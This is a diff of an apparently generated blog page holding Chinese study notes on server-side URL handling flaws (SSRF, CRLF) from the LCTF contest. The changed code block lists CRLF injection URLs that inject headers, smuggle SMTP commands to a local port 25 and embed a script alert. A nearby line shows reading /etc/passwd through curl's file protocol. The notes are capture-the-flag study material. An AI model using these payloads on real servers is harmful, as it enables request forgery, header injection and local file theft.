@@ -104,7 +104,7 @@
 <meta property="og:image" content="https://ws1.sinaimg.cn/large/93e435bbly1flpidcno9lj20kc0bb766.jpg">
 <meta property="og:image" content="https://ws1.sinaimg.cn/large/93e435bbly1flpislsoajj20d806adg6.jpg">
 <meta property="og:image" content="https://ws1.sinaimg.cn/large/93e435bbly1flphsi6huij20d90b0q4i.jpg">
-<meta property="og:updated_time" content="2017-11-21T03:57:35.169Z">
+<meta property="og:updated_time" content="2017-11-21T04:05:49.508Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="服务端URL处理问题学习笔记 SSRF/CRLF/其他">
 <meta name="twitter:description" content="LCTF里好多涉及到服务端对url进行处理的问题啊，也暴露出了自己对这一块知识的严重欠缺，ssrf也做过些笔记，但总感觉还不足以专门写东西发出来，通过在LCTF中的一些知识点收集以及自己的一些搜索，感觉在服务端的URL处理这块已经比较全面了，故做下整理，虽然现在认识还很浅，以后慢慢补充吧，保持更新~ 顺便膜一下orange大大，orange师傅在blackhat上的议题再一次刷新了自己对一名真正的">
@@ -424,12 +424,14 @@
 <h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><p>orange师傅同样整理了一份当前存在CRLF漏洞的名单出来，在攻击时首先将请求指向自己的vps看看服务端是用什么发出的请求，如果在库里面，就存在CRLF可以利用</p>
 <p>可以看到常见的urllib2,wget,NodeJS http,Java net.URL都存在这种问题</p>
 <p><img src="https://ws1.sinaimg.cn/large/93e435bbly1flphsi6huij20d90b0q4i.jpg" alt=""></p>
-<p>比如在lctf中的一个题目，可以看到url是urllib2发起的，所以使用<code>0:8000?url=http://118.89.16.36%0d%0aheaderInject:%20Inject:80/x/</code>就可以访问到自己的vps，同时带有可控的header头，然后利用header头可控来实现控制redis。</p>
 <p><strong>利用CRLF可以实现的一些东西</strong></p>
 <ul>
-<li><code>%0d%0a</code>代表http中的一个换行，也就可以新引入一个header头，如果连用两次，就代表头结束了，接下来的是内容，所以可以将后面一些比较讨厌的头去掉，比如CSP2333  。 还可以写任意的传输数据，比如写一些xss啥的。</li>
-<li>自己可以添加任意的头，比如Cookie实现会话控制，比如实现一些特殊的协议，就像lctf中的实现redis的控制，orange的通过https发送SMTP报文</li>
+<li><p><code>%0d%0a</code>代表http中的一个换行，也就可以新引入一个header头，如果连用两次，就代表头结束了，接下来的是内容，所以可以将后面一些比较讨厌的头去掉，比如CSP2333  。 还可以写任意的传输数据，比如写一些xss啥的。</p>
+</li>
+<li><p>自己可以添加任意的头，比如Cookie实现会话控制，比如实现一些特殊的协议，就像lctf中的实现redis的控制，orange的通过https发送SMTP报文</p>
+</li>
 </ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0:8000?url=https://127.0.0.1 %0d%0aHELO orange.tw%0d%0aMAIL FROM...:25</div><div class="line"></div><div class="line">0:8000?url=http://118.89.16.36%0d%0aheaderInject:%20Inject%0d%0a%0d%0a&lt;script&gt;alert(&apos;123&apos;)&lt;/script&gt;:80/x/</div><div class="line"></div><div class="line">0:8000?url=http://118.89.16.36%0d%0aheaderInject:%20Inject:80/x/</div></pre></td></tr></table></figure>
 <h2 id="利用发送请求库的特殊功能"><a href="#利用发送请求库的特殊功能" class="headerlink" title="利用发送请求库的特殊功能"></a>利用发送请求库的特殊功能</h2><ul>
 <li><p>curl支持file协议，所以url为<code>file:///etc/passwd</code>是可以看实现本地文件读取的</p>
 </li>
